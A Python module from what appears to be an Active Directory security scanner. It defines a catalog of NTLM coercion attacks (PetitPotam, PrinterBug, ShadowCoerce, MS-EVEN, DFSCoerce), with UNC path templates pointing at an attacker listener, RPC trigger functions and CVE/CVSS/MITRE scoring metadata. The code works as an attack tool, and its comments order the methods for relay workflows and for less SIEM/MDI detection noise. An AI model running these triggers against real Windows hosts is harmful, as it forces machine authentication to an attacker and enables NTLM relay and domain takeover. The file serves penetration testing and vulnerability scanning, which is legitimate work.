"""Native coercion method registry.

The matrix is intentionally declarative and mirrors the public Coercer model:
each method owns metadata, listener path templates, and one trigger callable.
The runtime decides endpoint selection, retries, timeouts, and UX.

Each row is also tagged with public CVE/CVSS/MITRE metadata so the CVE
scanner adapter can group methods by *technique* (PetitPotam, PrinterBug,
ShadowCoerce, MSEvenCoerce, DFSCoerce) and emit one finding per technique.
"""

from __future__ import annotations

import secrets
import string
from typing import Any

from adscan_internal.services.coercion.core import CoercionMethod, RpcSession

_BAD_NETPATH_MARKERS = (
    "error_bad_netpath",
    "bad_netpath",
    "path_not_found",
    "rpc_s_access_denied",
    "server_unavailable",
)

# Every SMB/HTTP coercion template ends in a literal NUL (``{nul}`` -> ``\x00``),
# mirroring Coercer's COERCE-mode ``exploit_paths``. The trailing NUL is
# load-bearing: many EFSR/DFSNM/RPRN UNC parsers treat it as the path-string
# terminator and only then perform the netpath lookup that triggers the
# outbound authentication. Without it the target parses the path differently
# and returns ACCESS_DENIED without ever calling back. MS-EVEN's ``\??\UNC\..\aa``
# form is the documented exception and intentionally carries no NUL.
_EFSR_PATHS = (
    ("smb", r"\\{listener}{listen_port}\{rnd:8}\file.txt{nul}"),
    ("smb", r"\\{listener}{listen_port}\{rnd:8}\\{nul}"),
    ("smb", r"\\{listener}{listen_port}\{rnd:8}{nul}"),
    ("http", r"\\{listener}{listen_port}/{rnd:3}\share\file.txt{nul}"),
)

_GENERIC_UNC_PATHS = (
    ("smb", r"\\{listener}{listen_port}\{rnd:8}\file.txt{nul}"),
    ("smb", r"\\{listener}{listen_port}\{rnd:8}\\{nul}"),
    ("smb", r"\\{listener}{listen_port}\{rnd:8}{nul}"),
    ("http", r"\\{listener}{listen_port}/{rnd:3}\share\file.txt{nul}"),
)

# MS-RPRN / MS-FSRVP coerce on a bare ``\\{listener}`` UNC (coercer's
# ``exploit_paths`` form), not the EFSR ``\{rnd}\file.txt`` shape.
_RPRN_PATHS = (
    ("smb", r"\\{listener}{nul}"),
    ("http", r"\\{listener}{listen_port}/{rnd:3}{nul}"),
)

_FSRVP_PATHS = (
    ("smb", r"\\{listener}{nul}"),
    ("http", r"\\{listener}{listen_port}/{rnd:3}{nul}"),
)


# Technique-level metadata. The CVE scanner adapter groups results by
# ``technique`` and emits one CVEResult per technique using these fields.
_TECHNIQUE_META: dict[str, dict[str, Any]] = {
    "PetitPotam": {
        "cve_id": "CVE-2021-36942",
        # MSRC publishes 7.5 at PR:N in this C:H/I:N shape (NIST scores the
        # same 7.5 as C:N/I:H); PR:L computes 6.5 and contradicted the number.
        "cvss_v3": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "mitre": ("T1187",),
        "references": (
            "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942",
            "https://github.com/topotam/PetitPotam",
        ),
    },
    "PrinterBug": {
        "cve_id": None,
        # ADscan's own grading, NOT a CVSS base score: no authority publishes
        # one (Microsoft treats this coercion primitive as by-design, so there
        # is no CVE). The vector describes the primitive itself and computes
        # 6.5; ADscan grades the exposure HIGH because its value to an attacker
        # is the NTLM relay chain it enables, which a Base score cannot express.
        # Allow-listed in tests/unit/services/cve_scanner/test_cvss_vector_agreement.py.
        "cvss_v3": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "mitre": ("T1187",),
        "references": ("https://github.com/leechristensen/SpoolSample",),
    },
    "ShadowCoerce": {
        "cve_id": None,
        # Derived from the vector below; stays in the MEDIUM band.
        "cvss_v3": 5.4,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
        "mitre": ("T1187",),
        "references": ("https://github.com/ShutdownRepo/ShadowCoerce",),
    },
    "MSEvenCoerce": {
        "cve_id": None,
        # Derived from the vector below; stays in the MEDIUM band.
        "cvss_v3": 5.4,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
        "mitre": ("T1187",),
        "references": ("https://github.com/Wh04m1001/MS-EVEN",),
    },
    "DFSCoerce": {
        "cve_id": None,
        # ADscan's own grading, NOT a CVSS base score: no authority publishes
        # one (Microsoft treats this coercion primitive as by-design, so there
        # is no CVE). The vector describes the primitive itself and computes
        # 6.5; ADscan grades the exposure HIGH because its value to an attacker
        # is the NTLM relay chain it enables, which a Base score cannot express.
        # Allow-listed in tests/unit/services/cve_scanner/test_cvss_vector_agreement.py.
        "cvss_v3": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "mitre": ("T1187",),
        "references": ("https://github.com/Wh04m1001/DFSCoerce",),
    },
}


# Method name → public technique. Adding a new method onboards into a
# technique by adding one row here.
_METHOD_TECHNIQUE: dict[str, str] = {
    "EfsRpcOpenFileRaw": "PetitPotam",
    "EfsRpcEncryptFileSrv": "PetitPotam",
    "EfsRpcDecryptFileSrv": "PetitPotam",
    "EfsRpcQueryUsersOnFile": "PetitPotam",
    "EfsRpcQueryRecoveryAgents": "PetitPotam",
    "EfsRpcRemoveUsersFromFile": "PetitPotam",
    "EfsRpcAddUsersToFile": "PetitPotam",
    "EfsRpcFileKeyInfo": "PetitPotam",
    "EfsRpcDuplicateEncryptionInfoFile": "PetitPotam",
    "EfsRpcAddUsersToFileEx": "PetitPotam",
    "RpcRemoteFindFirstPrinterChangeNotificationEx": "PrinterBug",
    "RpcRemoteFindFirstPrinterChangeNotification": "PrinterBug",
    "IsPathSupported": "ShadowCoerce",
    "IsPathShadowCopied": "ShadowCoerce",
    "ElfrOpenBELW": "MSEvenCoerce",
    "NetrDfsAddStdRoot": "DFSCoerce",
    "NetrDfsRemoveStdRoot": "DFSCoerce",
}


def technique_for_method(method_name: str) -> str | None:
    """Return the public technique for a registered coercion method, if any."""

    return _METHOD_TECHNIQUE.get(method_name)


def technique_metadata(technique: str) -> dict[str, Any] | None:
    """Return CVE/CVSS/MITRE metadata for a public technique, if any."""

    meta = _TECHNIQUE_META.get(technique)
    return dict(meta) if meta else None


def default_coercion_methods() -> tuple[CoercionMethod, ...]:
    """Return the default native coercion catalog.

    The first methods are ordered for practical relay workflows: EFSR variants
    tend to be the most useful for DC coercion, followed by RPRN and additional
    RPC protocols that broaden coverage for workstation/server targets.
    """

    # Order mirrors Coercer's effectiveness ranking: lead with MS-RPRN
    # (PrinterBug) and MS-FSRVP (bare ``\\{listener}`` UNC, the highest-yield
    # vectors), then the most effective MS-EFSR calls (OpenFileRaw,
    # AddUsersToFile, AddUsersToFileEx) before the remaining EFSR surface, then
    # MS-EVEN and MS-DFSNM. Leading with the effective methods means a capture
    # lands within the first handful of attempts instead of after exhausting the
    # whole catalog — fewer triggers, far less SIEM/MDI noise.
    return (
        _method(
            "RpcRemoteFindFirstPrinterChangeNotificationEx",
            "RPRN",
            65,
            _RPRN_PATHS,
            _rprn_call("hRpcRemoteFindFirstPrinterChangeNotificationEx"),
            ("rpc_s_access_denied", "server_unavailable"),
        ),
        _method(
            "RpcRemoteFindFirstPrinterChangeNotification",
            "RPRN",
            62,
            _RPRN_PATHS,
            _rprn_call("hRpcRemoteFindFirstPrinterChangeNotification"),
            ("rpc_s_access_denied", "server_unavailable"),
        ),
        _method(
            "IsPathSupported",
            "FSRVP",
            8,
            _FSRVP_PATHS,
            _call("hRpcIsPathSupported"),
            (),
        ),
        _method(
            "IsPathShadowCopied",
            "FSRVP",
            9,
            _FSRVP_PATHS,
            _call("hRpcIsPathShadowCopied"),
            (),
        ),
        _method(
            "EfsRpcOpenFileRaw",
            "EFSR",
            0,
            _EFSR_PATHS,
            _call("hRpcEfsRpcOpenFileRaw"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcAddUsersToFile",
            "EFSR",
            9,
            _EFSR_PATHS,
            _call("hRpcEfsRpcAddUsersToFile"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcAddUsersToFileEx",
            "EFSR",
            15,
            _EFSR_PATHS,
            _call("hRpcEfsRpcAddUsersToFileEx"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcEncryptFileSrv",
            "EFSR",
            4,
            _EFSR_PATHS,
            _call("hRpcEfsRpcEncryptFileSrv"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcDecryptFileSrv",
            "EFSR",
            5,
            _EFSR_PATHS,
            _call("hRpcEfsRpcDecryptFileSrv"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcQueryUsersOnFile",
            "EFSR",
            6,
            _EFSR_PATHS,
            _call("hRpcEfsRpcQueryUsersOnFile"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcQueryRecoveryAgents",
            "EFSR",
            7,
            _EFSR_PATHS,
            _call("hRpcEfsRpcQueryRecoveryAgents"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcRemoveUsersFromFile",
            "EFSR",
            8,
            _EFSR_PATHS,
            _call("hRpcEfsRpcRemoveUsersFromFile"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcFileKeyInfo",
            "EFSR",
            12,
            _EFSR_PATHS,
            _call("hRpcEfsRpcFileKeyInfo"),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "EfsRpcDuplicateEncryptionInfoFile",
            "EFSR",
            13,
            _EFSR_PATHS,
            _call("hRpcEfsRpcDuplicateEncryptionInfoFile", duplicate_path=True),
            _BAD_NETPATH_MARKERS,
        ),
        _method(
            "ElfrOpenBELW",
            "EVEN",
            9,
            (("smb", r"\??\UNC\{listener}{listen_port}\{rnd:8}\aa"),),
            _call("hElfrOpenBELW"),
            _BAD_NETPATH_MARKERS,
        ),
        _method("NetrDfsAddStdRoot", "DFSNM", 12, _GENERIC_UNC_PATHS, _dfsnm_add, ()),
        _method(
            "NetrDfsRemoveStdRoot", "DFSNM", 13, _GENERIC_UNC_PATHS, _dfsnm_remove, ()
        ),
    )


def _method(
    name: str,
    protocol: str,
    opnum: int,
    paths: tuple[tuple[str, str], ...],
    trigger: Any,
    success_markers: tuple[str, ...],
) -> CoercionMethod:
    technique = _METHOD_TECHNIQUE.get(name)
    meta = _TECHNIQUE_META.get(technique or "", {})
    return CoercionMethod(
        name=name,
        protocol=protocol,
        opnum=opnum,
        auth_path_templates=paths,  # type: ignore[arg-type]
        trigger=trigger,
        success_markers=success_markers,
        technique=technique,
        cve_id=meta.get("cve_id"),
        cvss_v3=meta.get("cvss_v3"),
        cvss_vector=meta.get("cvss_vector"),
        mitre=tuple(meta.get("mitre", ())),
        references=tuple(meta.get("references", ())),
    )


def _call(method_name: str, *, duplicate_path: bool = False):
    async def _trigger(rpc: RpcSession, path: str) -> Any:
        method = getattr(rpc, method_name)
        if duplicate_path:
            result, err = await method(path, path)
        else:
            result, err = await method(path)
        if err is not None:
            raise err
        return result

    return _trigger


def _rprn_call(method_name: str):
    async def _trigger(rpc: RpcSession, path: str) -> Any:
        from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB

        printer = path.rstrip("\\")
        handle, err = await rpc.open_printer(printer)
        if err is not None:
            raise err
        method = getattr(rpc, method_name)
        result, err = await method(handle, PRINTER_CHANGE_ADD_JOB, pszLocalMachine=path)
        if err is not None:
            raise err
        return result

    return _trigger


async def _dfsnm_add(rpc: RpcSession, path: str) -> Any:
    result, err = await rpc.hRpcNetrDfsAddStdRoot(path, _random_share_name())
    if err is not None:
        raise err
    return result


async def _dfsnm_remove(rpc: RpcSession, path: str) -> Any:
    result, err = await rpc.hNetrDfsRemoveStdRoot(path, _random_share_name())
    if err is not None:
        raise err
    return result


def _random_share_name() -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(8))
